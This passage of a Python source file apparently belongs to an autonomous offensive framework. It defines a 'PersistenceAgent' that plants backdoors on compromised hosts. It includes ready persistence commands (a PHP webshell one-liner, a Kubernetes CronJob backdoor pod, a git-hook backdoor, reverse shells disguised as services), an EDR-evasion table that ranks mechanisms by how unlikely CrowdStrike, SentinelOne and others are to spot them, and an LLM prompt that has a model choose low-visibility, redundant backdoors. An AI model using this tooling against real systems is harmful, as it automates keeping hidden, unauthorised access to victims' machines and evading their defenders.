                "# Deploy MutatingWebhookConfiguration that adds backdoor container\n"
                "# to every new pod created in the cluster"
            ),
        },
        {
            "id": "k8s_cronjob",
            "name": "Kubernetes CronJob Pod Backdoor",
            "family": "container",
            "mechanism": "Create a CronJob that periodically spawns a backdoor pod",
            "stealth": "medium",
            "edr_visible": False,
            "requires_admin": True,
            "persist_cmd": (
                "kubectl create cronjob kube-system-health --image=alpine "
                "--schedule='*/10 * * * *' -- <payload>"
            ),
        },
    ],

    # ── Cross-platform / diskless mechanisms ──
    "cross_platform": [
        {
            "id": "diskless_persist",
            "name": "Fully Diskless / Memory-Only Persistence",
            "family": "diskless",
            "mechanism": "Execute entirely in memory via process injection or reflective loading",
            "stealth": "extreme",
            "edr_visible": False,
            "requires_admin": False,
            "persist_cmd": (
                "# Use diskless-persist tool for:\n"
                "# - Reflective DLL injection into long-running process\n"
                "# - Process hollowing of a legitimate binary\n"
                "# - /proc/self/mem overwrite (Linux)\n"
                "# - Thread execution hijacking"
            ),
        },
        {
            "id": "reverse_shell_service",
            "name": "Reverse Shell as Legitimate Service",
            "family": "shell",
            "mechanism": "Deploy a reverse shell disguised as a legitimate service/daemon",
            "stealth": "high",
            "edr_visible": False,
            "requires_admin": True,
            "persist_cmd": "<execute_command> to deploy reverse shell with systemd/sc",
        },
        {
            "id": "webshell_placement",
            "name": "Webshell Placement",
            "family": "shell",
            "mechanism": "Drop a webshell in webroot or upload directory for HTTP access",
            "stealth": "high",
            "edr_visible": False,
            "requires_admin": False,
            "persist_cmd": "echo '<?php system($_GET[\"x\"]); ?>' > <webroot>/cache/site-health.php",
        },
        {
            "id": "git_hook_backdoor",
            "name": "Git Hook Backdoor",
            "family": "application",
            "mechanism": "Install a malicious git hook (post-commit, pre-push) in a dev repo",
            "stealth": "extreme",
            "edr_visible": False,
            "requires_admin": False,
            "persist_cmd": (
                "echo '<payload>' > .git/hooks/post-commit && chmod +x .git/hooks/post-commit"
            ),
        },
    ],
}


# =============================================================================
# EDR visibility knowledge base — which mechanisms are monitored and how
# =============================================================================

class EDRKnowledge:
    """Elite knowledge: EDR monitoring signatures per persistence family.

    PersistenceAgent consults this before selecting mechanisms.  When an EDR
    or AV product is detected on the target, only mechanisms with low EDR
    signature are selected.
    """

    # EDR products known to monitor each persistence family
    FAMILY_EDR_COVERAGE: Dict[str, List[str]] = {
        "registry":         ["CrowdStrike", "SentinelOne", "Defender ATP", "Carbon Black", "Cylance", "Elastic EDR"],
        "scheduler":        ["CrowdStrike", "SentinelOne", "Defender ATP", "Carbon Black"],
        "service":          ["CrowdStrike", "SentinelOne", "Defender ATP", "Carbon Black"],
        "wmi":              ["CrowdStrike", "Defender ATP", "Carbon Black"],
        "winlogon":         ["CrowdStrike", "SentinelOne", "Defender ATP"],
        "boot":             ["CrowdStrike", "SentinelOne"],
        "lsa":              ["CrowdStrike", "SentinelOne", "Defender ATP"],
        "cron":             ["CrowdStrike Falcon (Linux)", "SentinelOne (Linux)"],
        "systemd":          ["CrowdStrike Falcon (Linux)"],
        "init":             ["CrowdStrike Falcon (Linux)", "SentinelOne (Linux)"],
        "ssh_keys":         [],   # No mainstream EDR monitors authorized_keys files
        "shell_profile":    [],   # Rarely monitored — too many legitimate uses
        "library_hijack":   ["CrowdStrike", "SentinelOne (Deep Visibility)"],
        "dll_hijack":       ["CrowdStrike", "SentinelOne", "Defender ATP"],
        "kernel":           ["CrowdStrike", "SentinelOne", "Carbon Black"],
        "desktop_autostart": ["CrowdStrike", "Defender ATP"],
        "diskless":         [],   # Extremely hard to detect — no filesystem artifacts
        "iam":              [],   # Cloud IAM changes monitored by CSPM, not EDR
        "serverless":       [],   # Cloud function changes monitored by CSPM, not EDR
        "compute":          [],   # Cloud compute changes monitored by CSPM, not EDR
        "container":        ["Falco", "Sysdig", "Aqua"],
        "image_hijack":     ["CrowdStrike", "SentinelOne", "Defender ATP"],
        "application":      [],   # Application-specific — low EDR coverage
        "defense_evasion":  [],   # Anti-forensics — no direct EDR signature
    }

    # Visibility score per family: 0 = invisible, 100 = blazing beacon
    FAMILY_VISIBILITY: Dict[str, int] = {
        "registry":          85,
        "scheduler":         70,
        "service":           80,
        "wmi":               60,
        "winlogon":          75,
        "boot":              50,
        "lsa":               55,
        "cron":              60,
        "systemd":           40,
        "init":              65,
        "ssh_keys":          15,
        "shell_profile":     10,
        "library_hijack":    30,
        "dll_hijack":        35,
        "kernel":            20,
        "desktop_autostart": 50,
        "diskless":          5,
        "iam":               25,
        "serverless":        20,
        "compute":           30,
        "container":         40,
        "image_hijack":      45,
        "application":       15,
        "defense_evasion":   5,
    }

    @classmethod
    def is_monitored_by_edr(cls, mechanism: Dict[str, Any], detected_edr: Optional[str] = None) -> bool:
        """Check if a given EDR product monitors this mechanism family.

        If no specific EDR is known, assumes a generic enterprise EDR stack
        (CrowdStrike + Defender ATP baseline).
        """
        family = mechanism.get("family", "unknown")
        monitored_by = cls.FAMILY_EDR_COVERAGE.get(family, [])

        if detected_edr:
            return detected_edr in monitored_by

        # Generic enterprise baseline: assume CrowdStrike is present
        return "CrowdStrike" in monitored_by

    @classmethod
    def get_visibility_score(cls, mechanism: Dict[str, Any]) -> int:
        """Return a 0-100 visibility score for a persistence mechanism."""
        return cls.FAMILY_VISIBILITY.get(mechanism.get("family", "unknown"), 50)

    @classmethod
    def recommend_for_environment(
        cls,
        platform: str,
        edr_detected: Optional[str],
        stealth_level: str,
        owned_user: str,
    ) -> List[Dict[str, Any]]:
        """Return the best persistence mechanisms for the given environment.

        Selection criteria (in order):
          1. Platform match (linux / windows / cloud / cross_platform)
          2. Stealth requirement: prefers low-visibility families
          3. EDR avoidance: filters out EDR-monitored families
          4. Privilege match: filters root/admin-only if running as user
          5. Family diversity: ensures redundancy across families
        """
        # Pool candidates across platform-specific and cross-platform catalogs
        candidates: List[Tuple[int, Dict[str, Any]]] = []

        for src_platform in (platform, "cross_platform"):
            mechanisms = PERSISTENCE_CATALOG.get(src_platform, [])
            for mech in mechanisms:
                # Filter by privilege requirement
                if mech.get("requires_root") and owned_user != "root" and owned_user != "SYSTEM":
                    continue
                if mech.get("requires_admin") and owned_user != "SYSTEM" and owned_user != "Administrator":
                    continue

                # Filter by EDR
                if stealth_level in ("maximum", "ghost") and cls.is_monitored_by_edr(mech, edr_detected):
                    continue

                # Score: lower visibility = better
                score = cls.get_visibility_score(mech)

                # Boost cross-platform mechanisms slightly when no platform match
                if src_platform == "cross_platform":
                    score += 5

                # Penalise heavily monitored mechanisms
                if mech.get("edr_visible"):
                    score += 40

                candidates.append((score, mech))

        # Sort by visibility score ascending (least visible first)
        candidates.sort(key=lambda x: x[0])

        return [mech for _, mech in candidates]


# =============================================================================
# PersistenceAgent
# =============================================================================

class PersistenceAgent(BaseAgent):
    """Persistence specialist — maintains access across reboots and credential rotation.

    Extends BaseAgent with agent_type "persistence".  Reads the environment
    from Hive Mind (owned hosts, platform, detected EDR, current privilege
    level), then deploys 2-3 redundant persistence mechanisms per host from
    a catalog of 50+ techniques across Linux, Windows, and Cloud.

    The redundancy strategy ensures that if one mechanism is discovered and
    removed, at least one backup remains.  Mechanisms are selected from
    different "families" to avoid a single detection signature wiping all
    persistence.

    Real tools:
      - diskless-persist : fileless / memory-only persistence
      - execute_command  : generic command execution on owned hosts
    """

    def __init__(
        self,
        agent_id: str = "",
        hive_mind: Optional[HiveMind] = None,
        tool_executor=None,
        llm_client=None,
    ):
        # BaseAgent sets self.agent_type, self.capabilities, etc.
        super().__init__(
            agent_id=agent_id or f"persist_{int(time.time())}",
            agent_type="persistence",
            hive_mind=hive_mind,
            tool_executor=tool_executor,
            llm_client=llm_client,
        )

        # Expand the standard CAPABILITY_LIBRARY entry for persistence
        self._register_expanded_capabilities()

        # Track deployed mechanisms per host for redundancy verification
        self._deployed: Dict[str, List[Dict[str, Any]]] = {}

    def _register_expanded_capabilities(self) -> None:
        """Expand the persistence agent's capabilities beyond the library defaults.

        The base CAPABILITY_LIBRARY has 5 persistence tools.  We expand to
        include diskless-persist, execute_command, and all mechanism IDs.
        """
        # Start with library-defined persistence tools
        base = list(CAPABILITY_LIBRARY.get("persistence", []))
        # Add real tool integrations
        base.extend([
            "diskless-persist",
            "execute_command",
        ])
        # Add all mechanism IDs as virtual tools for tracking
        for platform_mechs in PERSISTENCE_CATALOG.values():
            for mech in platform_mechs:
                base.append(mech["id"])
        # Deduplicate while preserving order
        seen: set = set()
        self.capabilities = []
        for tool in base:
            if tool not in seen:
                seen.add(tool)
                self.capabilities.append(tool)

        logger.info(
            "PersistenceAgent loaded %d capabilities (%d unique mechanisms)",
            len(self.capabilities),
            sum(len(v) for v in PERSISTENCE_CATALOG.values()),
        )

    # ------------------------------------------------------------------
    # Core think / reasoning — overrides BaseAgent.think()
    # ------------------------------------------------------------------

    def think(
        self,
        objective: str,
        context: Dict[str, Any],
        history: List[Dict[str, Any]],
    ) -> Dict[str, Any]:
        """Reason about the next persistence action.

        Specialised persistence reasoning:
          1. Reads environment from Hive Mind (owned hosts, EDR detection, platform)
          2. Checks what has already been deployed (avoid duplicates)
          3. Selects 2-3 mechanisms from the catalog using EDRKnowledge
          4. Returns tool_call actions for each selected mechanism

        Falls back to LLM reasoning if available, otherwise uses the
        built-in persistence knowledge base.
        """
        # ── LLM path (preferred) ──
        if self.llm_client:
            try:
                return self._persistence_llm_think(objective, context, history)
            except Exception as exc:
                logger.warning("LLM think failed (%s) — using knowledge base", exc)

        # ── Knowledge-base path ──
        return self._persistence_kb_think(objective, context, history)

    def _persistence_kb_think(
        self,
        objective: str,
        context: Dict[str, Any],
        history: List[Dict[str, Any]],
    ) -> Dict[str, Any]:
        """Deterministic persistence action selection using the knowledge base.

        Decides:
          - Whether to persist (are there owned hosts?)
          - Which hosts to target
          - Which 2-3 mechanisms to deploy per host
          - Whether to use diskless-persist or execute_command
        """
        # --- 1. Gather owned hosts from Hive Mind ---
        owned_hosts: List[Dict[str, Any]] = []
        if self.hive_mind:
            owned_hosts = list(self.hive_mind.compromised_hosts)

        # Fallback: check context for any host/session data
        if not owned_hosts:
            owned_hosts = self._extract_hosts_from_context(context)

        if not owned_hosts:
            return {
                "type": "complete",
                "summary": "No owned hosts available — nothing to persist on.",
                "confidence": 1.0,
                "reasoning": "Hive Mind has zero compromised hosts and context has no sessions.",
            }

        # --- 2. Determine environment per host ---
        stealth_level = context.get("stealth", "maximum")
        actions: List[Dict[str, Any]] = []
        all_mechanisms: List[Dict[str, Any]] = []

        for host in owned_hosts:
            platform = host.get("platform", host.get("os", "linux")).lower()
            if "win" in platform:
                platform = "windows"
            elif "linux" not in platform and "cloud" not in platform:
                platform = "linux"

            owned_user = host.get("current_user", host.get("access_level", "user"))
            edr_detected = host.get("edr_product", context.get("edr_detected"))
            host_id = host.get("hostname", host.get("ip", host.get("target", "unknown")))

            # Check what has already been deployed on this host
            already_deployed = self._deployed.get(host_id, [])
            deployed_families = {d.get("family", "") for d in already_deployed}
            deployed_ids = {d.get("id", "") for d in already_deployed}

            # --- 3. Select 2-3 redundant mechanisms ---
            recommended = EDRKnowledge.recommend_for_environment(
                platform=platform,
                edr_detected=edr_detected,
                stealth_level=stealth_level,
                owned_user=owned_user,
            )

            selected: List[Dict[str, Any]] = []
            selected_families: set = set()

            for mech in recommended:
                if len(selected) >= 3:
                    break
                # Skip if already deployed
                if mech["id"] in deployed_ids:
                    continue
                # Skip if family already selected (redundancy across families)
                if mech["family"] in selected_families and len(selected) >= 2:
                    continue
                selected.append(mech)
                selected_families.add(mech["family"])

            # If we couldn't find enough new families, pick from remaining
            if len(selected) < 2:
                for mech in recommended:
                    if len(selected) >= 3:
                        break
                    if mech["id"] not in deployed_ids and mech not in selected:
                        selected.append(mech)

            # --- 4. Build tool_call actions ---
            for mech in selected:
                tool_name = "diskless-persist" if mech["family"] == "diskless" else "execute_command"

                action = {
                    "type": "tool_call",
                    "tool": tool_name,
                    "params": {
                        "target": host_id,
                        "mechanism_id": mech["id"],
                        "mechanism_name": mech["name"],
                        "mechanism_family": mech["family"],
                        "persist_cmd": mech.get("persist_cmd", ""),
                        "platform": platform,
                        "stealth": stealth_level,
                    },
                    "confidence": 0.85,
                    "reasoning": (
                        f"Deploying {mech['name']} [{mech['family']}] on {host_id} "
                        f"(visibility={EDRKnowledge.get_visibility_score(mech)}/100). "
                        f"Redundancy across {len(selected)} families of {len(recommended)} candidates."
                    ),
                }
                actions.append(action)
                all_mechanisms.append(mech)

            # --- 5. Record intent in deployed tracker ---
            self._deployed.setdefault(host_id, []).extend(selected)

        if not actions:
            return {
                "type": "complete",
                "summary": (
                    f"All {len(owned_hosts)} host(s) already have sufficient persistence "
                    f"({sum(len(v) for v in self._deployed.values())} total mechanisms deployed)."
                ),
                "confidence": 0.9,
                "reasoning": "All recommended mechanisms already deployed on every owned host.",
            }

        # --- 6. Return first action; the framework will loop ---
        first = actions[0]
        return {
            "type": "tool_call",
            "tool": first["tool"],
            "params": first["params"],
            "confidence": first["confidence"],
            "reasoning": first["reasoning"],
        }

    def _persistence_llm_think(
        self,
        objective: str,
        context: Dict[str, Any],
        history: List[Dict[str, Any]],
    ) -> Dict[str, Any]:
        """LLM-guided persistence action selection."""
        tools_blob = "\n".join(
            f"  - {t} ({'diskless' if 'diskless' in t else 'command'})"
            for t in ["diskless-persist", "execute_command"]
        )
        hosts_blob = self._format_hosts_for_prompt()
        history_blob = (
            json.dumps([h.get("action", {}) for h in history[-5:]], indent=2)
            if history
            else "(none)"
        )

        import json

        prompt = f"""You are agent {self.agent_id} of type {self.agent_type}.
Your objective: {objective}

AVAILABLE TOOLS:
{tools_blob}

PERSISTENCE KNOWLEDGE:
You have access to 50+ persistence mechanisms across Linux, Windows, Cloud and
cross-platform (diskless, git hooks, webshells).  Core selection rules:

1. DEPLOY 2-3 REDUNDANT MECHANISMS per host, each from a DIFFERENT family.
2. Prefer LOW EDR VISIBILITY families: ssh_keys, shell_profile, library_hijack,
   diskless, kernel, time_provider_dll, appcert_dlls, netsh_helper_dll.
3. Avoid HEAVILY MONITORED families when EDR detected: registry, service,
   winlogon, scheduled_task (basic).
4. Match platform: Linux → cron/systemd/ssh_keys/LD_PRELOAD; Windows →
   WMI/DLL hijack/COM hijack/Time Provider; Cloud → IAM keys/Lambda triggers/
   cross-account roles.

OWNED HOSTS:
{hosts_blob}

RECENT HISTORY:
{history_blob}

CURRENT CONTEXT:
{json.dumps(context, default=str, indent=2)}

Respond with JSON for the NEXT persistence action:
  To call a tool:  {{"type": "tool_call", "tool": "diskless-persist"|"execute_command", "params": {{"target": "...", "mechanism_id": "...", ...}}, "reasoning": "..."}}
  To finish:       {{"type": "complete", "summary": "..."}}
  To ask operator: {{"type": "ask_operator", "question": "..."}}

Respond with valid JSON only."""

        response = self.llm_client.complete(prompt)
        try:
            action = json.loads(response)
            action.setdefault("confidence", 0.85)
            return action
        except json.JSONDecodeError:
            logger.warning("LLM returned non-JSON; falling back to KB")
            return self._persistence_kb_think(objective, context, history)

    # ------------------------------------------------------------------
    # Orchestrator-compatible execute() method
    # ------------------------------------------------------------------

    def execute(self, phase: Dict[str, Any], context: Dict[str, Any]) -> Dict[str, Any]:
        """Run persistence deployment for the given phase.

        This is the OrchestratorAgent-compatible entry point.  It wraps the
        BaseAgent think/act/observe loop into a single call.

        Args:
            phase: Phase spec with id, tools_needed, parameters, etc.
            context: Shared memory context from previous agents.

        Returns:
            Dict with success, data, error, elapsed_seconds.
        """
        start = time.time()
        phase_id = phase.get("id", "unknown")
        params = phase.get("parameters", {})
        label = phase.get("label", phase_id)
        stealth = params.get("stealth", "maximum")

        logger.info(
            "PERSISTENCE AGENT — %s | stealth=%s | %d hosts owned",
            label,
            stealth,
            len(self.hive_mind.compromised_hosts) if self.hive_mind else 0,
        )

        self.mark_started()

        # Gather owned hosts from Hive Mind or context
        owned_hosts: List[Dict[str, Any]] = []
        if self.hive_mind:
            owned_hosts = list(self.hive_mind.compromised_hosts)
        if not owned_hosts:
            owned_hosts = self._extract_hosts_from_context(context)

        if not owned_hosts:
            elapsed = time.time() - start
            return {
                "success": False,
                "error": "No owned hosts found — cannot deploy persistence",
                "data": {"mechanisms_deployed": 0, "hosts_targeted": 0},
                "elapsed_seconds": round(elapsed, 2),
            }

        # Run the think/act loop for each host
        errors: List[str] = []
        all_results: List[Dict[str, Any]] = []
        total_mechanisms = 0

        for host in owned_hosts:
            host_id = host.get("hostname", host.get("ip", host.get("target", "unknown")))
            platform = host.get("platform", host.get("os", "linux")).lower()
            if "win" in platform:
                platform = "windows"
            elif "linux" not in platform and "cloud" not in platform:
                platform = "linux"

            owned_user = host.get("current_user", host.get("access_level", "user"))
            edr_detected = host.get("edr_product", context.get("edr_detected"))

            # Get recommendations
            recommended = EDRKnowledge.recommend_for_environment(
                platform=platform,
                edr_detected=edr_detected,
                stealth_level=stealth,
                owned_user=owned_user,
            )

            # Deploy 2-3 mechanisms
            deployed_count = 0
            for mech in recommended[:3]:
                try:
                    tool_name = "diskless-persist" if mech["family"] == "diskless" else "execute_command"
                    result = self.execute_tool(
                        tool_name,
                        {
                            "target": host_id,
                            "mechanism_id": mech["id"],
                            "mechanism_name": mech["name"],
                            "mechanism_family": mech["family"],
                            "persist_cmd": mech.get("persist_cmd", ""),
                            "platform": platform,
                            "stealth": stealth,
                        },
                    )
                    all_results.append({
                        "host": host_id,
                        "mechanism": mech["name"],
                        "family": mech["family"],
                        "stealth": mech["stealth"],
                        "visibility_score": EDRKnowledge.get_visibility_score(mech),
                        "result": result,
                    })
                    if result.get("success"):
                        deployed_count += 1
                        total_mechanisms += 1
                        self._deployed.setdefault(host_id, []).append(mech)
                except Exception as exc:
                    msg = f"Failed to deploy {mech['name']} on {host_id}: {exc}"
                    logger.exception(msg)
                    errors.append(msg)

            # Report to Hive Mind
            if self.hive_mind and deployed_count > 0:
                for mech in recommended[:deployed_count]:
                    self.hive_mind.add_persistence(
                        {
                            "host": host_id,
                            "mechanism": mech["name"],
                            "family": mech["family"],
                            "platform": platform,
                            "stealth": mech["stealth"],
                        },
                        agent=self.agent_id,
                    )

        elapsed = time.time() - start
        success = total_mechanisms > 0 and len(errors) < len(owned_hosts)

        return {
            "success": success,
            "data": {
                "mechanisms_deployed": total_mechanisms,
                "hosts_targeted": len(owned_hosts),
                "deployments": all_results,
                "redundancy_ratio": round(total_mechanisms / max(len(owned_hosts), 1), 1),
            },
            "persistence_installed": total_mechanisms > 0,
            "error": "; ".join(errors) if errors else None,
            "elapsed_seconds": round(elapsed, 2),
        }

    # ------------------------------------------------------------------
    # Utility: extract hosts from context
    # ------------------------------------------------------------------

    @staticmethod
    def _extract_hosts_from_context(context: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Extract host/session data from shared context when Hive Mind is empty.

        Searches for hosts in:
          1. Direct key: "compromised_hosts" or "owned_hosts" (lists of dicts)
          2. Nested dict values containing session_id + target
          3. Nested dict values containing just target
          4. Lists of host dicts nested inside context values
        """
        hosts: List[Dict[str, Any]] = []

        # Direct named keys for compromised / owned host lists
        for key_name in ("compromised_hosts", "owned_hosts", "hosts"):
            val = context.get(key_name)
            if isinstance(val, list):
                for item in val:
                    if isinstance(item, dict) and (item.get("hostname") or item.get("ip") or item.get("target")):
                        hosts.append({
                            "hostname": item.get("hostname", item.get("ip", item.get("target", "unknown"))),
                            "ip": item.get("ip", item.get("target", "")),
                            "platform": item.get("platform", item.get("os", "linux")),
                            "current_user": item.get("current_user", item.get("access_level", "user")),
                            "edr_product": item.get("edr_product"),
                            "session_id": item.get("session_id", ""),
                        })

        # Search values for host-like dicts
        for v in context.values():
            # Nested lists of hosts
            if isinstance(v, list):
                for item in v:
                    if isinstance(item, dict) and (item.get("hostname") or item.get("ip") or item.get("target")):
                        hosts.append({
                            "hostname": item.get("hostname", item.get("ip", item.get("target", "unknown"))),
                            "ip": item.get("ip", item.get("target", "")),
                            "platform": item.get("platform", item.get("os", "linux")),
                            "current_user": item.get("current_user", item.get("access_level", "user")),
                            "edr_product": item.get("edr_product"),
                            "session_id": item.get("session_id", ""),
                        })

            if not isinstance(v, dict):
                continue

            # Exploit session data
            if v.get("session_id") and v.get("target"):
                hosts.append({
                    "hostname": v.get("hostname", v["target"]),
                    "ip": v.get("target", ""),
                    "platform": v.get("os", v.get("platform", "linux")),
                    "current_user": v.get("access_level", v.get("current_user", "user")),
                    "edr_product": v.get("edr_product"),
                    "session_id": v["session_id"],
                })

            # Recon target data (only if not already captured via session check)
            if v.get("target") and not v.get("session_id"):
                hosts.append({
                    "hostname": v.get("hostname", v["target"]),
                    "ip": v.get("target", ""),
                    "platform": v.get("os", v.get("platform", "linux")),
                    "current_user": "user",
                    "edr_product": v.get("edr_product"),
                })

        # Deduplicate by ip/hostname
        seen: set = set()
        deduped: List[Dict[str, Any]] = []
        for h in hosts:
            key = h.get("ip") or h.get("hostname", "")
            if key and key not in seen:
                seen.add(key)
                deduped.append(h)
        return deduped

    def _format_hosts_for_prompt(self) -> str:
        """Format owned hosts for injection into the LLM prompt."""
        if not self.hive_mind:
            return "(no Hive Mind connected)"

        lines: List[str] = []
        for host in self.hive_mind.compromised_hosts[-20:]:
            host_id = host.get("hostname", host.get("ip", "?"))
            platform = host.get("platform", host.get("os", "linux"))
            user = host.get("current_user", host.get("access_level", "user"))
            edr = host.get("edr_product", "none detected")
            deployed = len(self._deployed.get(host_id, []))
            lines.append(
                f"  - {host_id} | platform={platform} | user={user} | "
                f"edr={edr} | already_deployed={deployed}"
            )
        return "\n".join(lines) if lines else "(no compromised hosts)"

    # ------------------------------------------------------------------
    # Status reporting
    # ------------------------------------------------------------------

    def report_status(self) -> Dict[str, Any]:
        """Extended status including deployed persistence mechanisms."""
        base = super().report_status()
        base["persistence"] = {
            "hosts_persisted": len(self._deployed),
            "total_mechanisms": sum(len(v) for v in self._deployed.values()),
            "deployments": {
                host: [m["name"] for m in mechs]
                for host, mechs in self._deployed.items()
            },
        }
        return base

    # ------------------------------------------------------------------
    # Mechanism enumeration (for operators and planning)
    # ------------------------------------------------------------------

    @classmethod
    def list_all_mechanisms(cls) -> Dict[str, int]:
        """Return a count of available mechanisms by platform."""
        return {
            platform: len(mechs)
            for platform, mechs in PERSISTENCE_CATALOG.items()
        }

    @classmethod
    def get_mechanisms_by_stealth(cls, min_stealth: str = "high") -> List[Dict[str, Any]]:
        """Return mechanisms at or above a given stealth level.

        Stealth levels (ascending): low, medium, high, very_high, extreme
        """
        stealth_order = {"low": 0, "medium": 1, "high": 2, "very_high": 3, "extreme": 4}
        threshold = stealth_order.get(min_stealth, 2)

        results: List[Dict[str, Any]] = []
        for platform_mechs in PERSISTENCE_CATALOG.values():
            for mech in platform_mechs:
                if stealth_order.get(mech.get("stealth", "medium"), 0) >= threshold:
                    results.append(mech)
        return results
